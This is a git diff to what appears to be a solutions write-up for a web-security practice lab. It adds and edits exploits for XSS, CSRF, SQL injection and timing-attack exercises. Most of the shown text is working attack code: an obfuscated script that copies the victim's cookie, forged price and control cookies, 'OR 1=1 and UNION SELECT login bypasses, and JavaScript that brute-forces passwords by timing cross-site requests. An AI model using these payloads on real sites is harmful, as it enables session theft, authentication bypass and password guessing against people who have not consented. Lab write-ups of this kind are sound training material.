@@ -43,7 +43,7 @@ Exploit:
     eval(unescape(/%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%73%74%6F%6C%65%6E%5F%63%6F%6F%6B%69%65%27%29%2E%76%61%6C%75%65%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B/).slice(1,-1));
     </script>
 
-###5.  XSS Type 1 - Filtering: Revolution
+### 5.  XSS Type 1 - Filtering: Revolution
 
 Exploit:
 
@@ -145,7 +145,7 @@ Exploit:
     window.location.replace("http://www.stanford.edu");
     </script>
 
-### 15. Session - Has my time come?
+### 15. CSRF - Has my time come?
 
 Exploit:
 
@@ -158,7 +158,7 @@ Exploit:
     document.write(html);
     </script>
 
-### 16. Session - HTTP parameter pollution
+### 16. CSRF - HTTP parameter pollution
 
 Exploit:
 
@@ -200,3 +200,85 @@ Exploit:
     var cont = "3956e4b5c8dc7982f985c5f495c7c49fbe95dcc7";
     document.cookie="price=299;";
     document.cookie="control="+cont+";";
+
+### 22. SQL Injection - Basic bypass
+
+Name: Edric
+Password: 'OR 1=1 #
+
+### 23. SQL Injection - Ultimate bypass
+
+    Name: Edric
+    Password: 'Union ALL SELECT uid FROM ebad_users #
+
+### 24. Mixing Content - Timing attack #1
+
+Exploit:
+
+for(var pass of passwords){
+    var start = new Date();
+    var myRequest = new XMLHttpRequest();
+    try {
+        myRequest.open("POST", "http://otherSiteA/exercises/mixingContent/authLvl1.php", false);
+        myRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        myRequest.send("pass="+pass);
+    }
+    catch(e) {
+    }
+    var finish = new Date();
+    var diff = (finish.getTime() - start.getTime());
+    if(diff > 1000){
+        alert( pass );
+    }
+}
+
+### 25. Mixing Content -Timing attack #2
+
+if (LOADED)
+{
+    function callback(i, start_time) 
+    {
+        document.getElementById('div2'+i).innerHTML = (new Date()).getTime() - start_time;
+    }   
+
+    function group(gp_index)
+    {
+        var low = gp_size * gp_index;
+        var high = gp_size * (gp_index + 1);
+
+        for (var i=low; i<high; ++i)
+        {
+            var name = document.getElementById("name"+i).innerHTML;
+
+            var div1 = document.createElement("div");
+            div1.innerHTML = '--' + name + '--';
+            document.body.appendChild(div1);
+
+            var div2 = document.createElement("div");
+            div2.innerHTML = '?';
+            div2.setAttribute('id', 'div2'+i);
+            document.body.appendChild(div2);
+
+            var img = document.createElement("img");
+            img.setAttribute('src', url_base + "?pass=pass&name=" + name);
+            img.setAttribute('onerror', "callback(" + i + ","+ (new Date()).getTime() +")");
+            document.body.appendChild(img);
+        }
+    }
+
+    function doSetTimeout(i)
+    {
+        delay_time += interval;
+        setTimeout(function(){ group(i); }, delay_time);
+    }
+
+    var url_base = "http://otherSiteA/exercises/mixingContent/authLvl2.php";
+    var total_size = 32;
+    var gp_size = 4;
+    var gp_num = total_size / gp_size;
+    var interval = 1000;
+    var delay_time = 0;
+
+    for (var i=0; i<gp_num; ++i)
+        doSetTimeout(i);
+} else {var LOADED=true;}
